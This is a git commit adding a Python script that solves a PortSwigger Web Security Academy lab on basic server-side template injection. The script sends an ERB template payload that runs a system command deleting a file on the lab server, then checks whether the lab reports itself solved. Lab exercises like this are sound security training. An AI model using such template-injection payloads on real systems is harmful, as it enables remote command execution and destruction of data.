d7cd5bce329f96d11c57f3a8ee814ebd2079fe0e
jacopoaugelli <jacopo.augelli777@gmail.com>
2023-10-02 20:17:03 +0200

    Lab solved

---
+++ PortSwigger/Server Side Template Injection/01_SSTI.py
@@ -0,0 +1,14 @@
+import requests
+import argparse
+
+parser = argparse.ArgumentParser(description='Solves the following Lab: Basic server-side template injection')
+parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
+lab = parser.parse_args()
+
+r = requests.get("https://" + lab.id + ".web-security-academy.net/?message=<%=system('rm /home/carlos/morale.txt')%>")
+
+try:
+    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
+    print('Lab solved.')
+except Exception:
+    print("Error while trying to solve the lab.")
